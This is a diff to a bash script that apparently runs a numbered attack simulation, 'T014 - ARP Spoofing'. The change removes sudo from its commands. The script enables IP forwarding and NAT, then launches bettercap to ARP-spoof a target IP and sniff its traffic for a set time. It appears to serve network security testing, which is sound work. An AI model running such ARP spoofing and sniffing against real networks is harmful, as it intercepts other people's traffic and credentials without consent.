@@ -56,8 +56,8 @@ cleanup() {
 
     # Stop ARP spoofing & reset forwarding rules
     print_action "Disabling IP forwarding and removing NAT rule"
-    sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null
-    sudo iptables -t nat -D POSTROUTING -o $FWD_INTERFACE -j MASQUERADE
+    sysctl -w net.ipv4.ip_forward=0 > /dev/null
+    iptables -t nat -D POSTROUTING -o $FWD_INTERFACE -j MASQUERADE
     print_success "IP forwarding and NAT rule removed"
 
     # Revert mode
@@ -138,15 +138,15 @@ ensure_managed_mode
 
 # Enabled IP forwarding and NAT
 print_action "Enabling IP forwarding and NAT on $INTERFACE → $FWD_INTERFACE"
-sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
-sudo iptables -t nat -A POSTROUTING -o $FWD_INTERFACE -j MASQUERADE
+sysctl -w net.ipv4.ip_forward=1 > /dev/null
+iptables -t nat -A POSTROUTING -o $FWD_INTERFACE -j MASQUERADE
 print_success "IP forwarding and NAT rule added"
 
 # Run attack
 print_blank
 print_info "Running T014 - ARP Spoofing attack for $DURATION seconds"
 print_blank
-sudo timeout "$DURATION" bettercap -iface "$INTERFACE" -eval "set arp.spoof.targets $TARGET_IP; arp.spoof on; net.sniff on"
+timeout "$DURATION" bettercap -iface "$INTERFACE" -eval "set arp.spoof.targets $TARGET_IP; arp.spoof on; net.sniff on"
 
 EXIT_CODE=$?
 
